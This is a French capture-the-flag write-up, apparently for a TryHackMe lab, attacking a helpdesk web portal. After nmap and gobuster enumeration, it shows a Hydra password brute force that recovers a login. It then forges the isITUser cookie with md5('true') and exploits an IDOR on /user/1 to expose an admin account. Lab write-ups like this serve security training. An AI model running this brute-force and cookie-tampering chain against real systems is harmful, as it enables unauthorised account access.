## 1. Reconnaissance

### Scan Nmap

```bash
sudo nmap -sV -sC <TARGET_IP> -oA nmap
```

Résultat :

```text
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```


Le service SSH nécessite des identifiants et ne constitue pas un point d'entrée immédiat. L'attention se porte donc sur l'application web exposée sur le port 80.

---

## 2. Analyse de l'application web

La page d'accueil présente un portail interne nommé **Support Operations Panel**.

Le code source HTML révèle un formulaire d'authentification simple :

```html
<form method="POST">

<input type="email" name="email">
<input type="password" name="password">


Problems signing in? Contact IT Operations @ help@support.thm
```

Email = help@support.thm pour brute-force.

---

## 3. Énumération des ressources web

### Gobuster

```bash
gobuster dir \
-u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,js,bak,zip
```

Résultats :

```text
/info.php             (Status: 200)
/index.php            (Status: 200)
/footer.php           (Status: 200)

/skins                (Status: 301)
/includes             (Status: 301)
/layout               (Status: 301)
/js                   (Status: 301)

/api.php              (Status: 302)
/logout.php           (Status: 302)
/dashboard.php        (Status: 302)

/config.php           (Status: 200)

/server-status        (Status: 403)
```

#### Ressources accessibles (200 OK)

Le code HTTP `200 OK` indique que la ressource est accessible et renvoie du contenu.

```text
/info.php
/index.php
/footer.php
/config.php
```

Les fichiers les plus intéressants sont :

- `info.php` : expose une page `phpinfo()` contenant des informations détaillées sur l'environnement PHP du serveur ;
- `config.php` : fichier de configuration potentiellement sensible ;
- `index.php` : page principale de l'application.

#### Répertoires découverts (301 Moved Permanently)

Le code HTTP `301 Moved Permanently` indique que le répertoire existe et redirige automatiquement vers une URL terminée par `/`.

Répertoires découverts :

```text
/skins/
/includes/
/layout/
/js/
```

Ces répertoires pourront être investigués ultérieurement car ils peuvent contenir :

- des composants PHP ;
- des templates HTML ;
- des fichiers JavaScript ;
- des endpoints internes.

#### Pages protégées (302 Found)

Le code HTTP `302 Found` indique une redirection temporaire.

Dans ce contexte, cela signifie que la ressource existe mais qu'un mécanisme d'authentification empêche son accès direct.

```text
/api.php
/dashboard.php
/logout.php
```

La redirection observée est :

```http
HTTP/1.1 302 Found
Location: index.php
```

Cette réponse fournit déjà plusieurs informations importantes :

- les ressources existent réellement ;
- un contrôle d'accès est mis en place ;
- les utilisateurs non authentifiés sont redirigés vers la page de connexion.

#### Ressources interdites (403 Forbidden)

Le code HTTP `403 Forbidden` indique que la ressource existe mais que le serveur refuse explicitement l'accès.

```text
/server-status
```

Cette ressource correspond généralement au module Apache `mod_status`, qui fournit des informations internes sur le serveur web.

L'accès est correctement restreint.

---

## 4. Analyse de phpinfo()

Le fichier `info.php` expose une page `phpinfo()` complète.

Les informations suivantes sont récupérées :

```text
DOCUMENT_ROOT = /var/www/html

session.save_path = /var/lib/php/sessions

disable_functions = no value

open_basedir = no value
```

Cette étape permet de mieux comprendre l'environnement serveur sans toutefois fournir de credentials exploitables.

---

## 5. Analyse des mécanismes d'authentification

Les pages sensibles sont testées directement :

```bash
curl -i http://<TARGET_IP>/dashboard.php

curl -i http://<TARGET_IP>/api.php
```

Les deux renvoient :

```http
HTTP/1.1 302 Found
Location: index.php
```

L'accès est donc protégé par une authentification préalable.

L'analyse de `logout.php` révèle également l'existence d'un cookie supplémentaire :

```http
Set-Cookie: isITUser=deleted
```

Ce cookie semble jouer un rôle dans la logique applicative mais ne permet pas, seul, de contourner l'authentification.

---

## 6. Interception du formulaire avec Burp Suite

Le formulaire est intercepté afin de comprendre son fonctionnement.

Règlage du proxy firefox : Name Burp + Address : 127.0.0.1 : 8080

Requête observée :

```http
POST / HTTP/1.1

email=pozer%40pozerze.com&password=popotertperopt
```

Le formulaire est particulièrement simple :

- aucun token CSRF ;
- aucun paramètre caché ;
- uniquement les champs `email` et `password`.

Une tentative invalide retourne systématiquement :

```html
<div class="alert alert-danger">
Invalid credentials
</div>
```

---

## 7. Brute force ciblé

L'adresse `help@support.thm`, découverte lors de l'énumération, est utilisée comme nom d'utilisateur potentiel.

Une attaque Hydra est lancée.

```bash
hydra \
-l help@support.thm \
-P /usr/share/wordlists/rockyou.txt \
<TARGET_IP> \
http-post-form \
"/:email=^USER^&password=^PASS^:Invalid credentials"


Résultat :
login: help@support.thm
password: snoopy
```

Acces initial sur help@support.thm / password : snoopy

# 14. Contournement du contrôle d'accès via le cookie isITUser

L'accès à l'endpoint `api.php` est initialement refusé.

```bash
curl -c cookies.txt \
-d "email=help@support.thm&password=snoopy" \
-X POST \
http://<TARGET_IP>/

curl -b cookies.txt \
http://<TARGET_IP>/api.php
```

Réponse :

```text
Access denied
```

Après authentification, un cookie supplémentaire est observé. La longueur du cookie (32 caractères) suggère l'utilisation d'un hash MD5.

```bash
PHPSESSID

isITUser=68934a3e9455fa72420237eb05902327 => cracker = false

On tente avec hash md("true")
md5("true") : b326b5062b2f0e69046810717534cb09

Cookie :
isITUser=b326b5062b2f0e69046810717534cb09
```

L'accès à l'API interne est désormais autorisé.

---

# 15. Découverte de l'Internal User API

Une fois le cookie modifié, `api.php` affiche une nouvelle interface.

```text
Internal User API
```

L'application fournit un indice :

```json
As a helpdesk user, you can query your own profile:

/user/3

{
    "email": "help@support.thm",
    "2FA": false,
    "admin": false
}
```

Cette découverte révèle plusieurs éléments importants :

- existence d'une API interne ;
- divulgation d'informations sensibles.
- présence d'identifiants numériques pour les utilisateurs ;
- le compte Helpdesk correspond à l'utilisateur `3` ;
- Possibilité IDOR/BOLA

---

# 16. Exploitation d'une vulnérabilité IDOR (BOLA)

L'identifiant `1` révèle alors un compte administrateur.

```json
Get /user/1
{
  "email":"specialadmin@support.thm",
  "2FA":false,
  "admin":true
}
```


---

# Vulnérabilités identifiées

- Weak Access Control
    
- Cookie Tampering
    
- Insecure Authorization Logic
    
- Exposure of Internal API
    
- Potentielle vulnérabilité IDOR
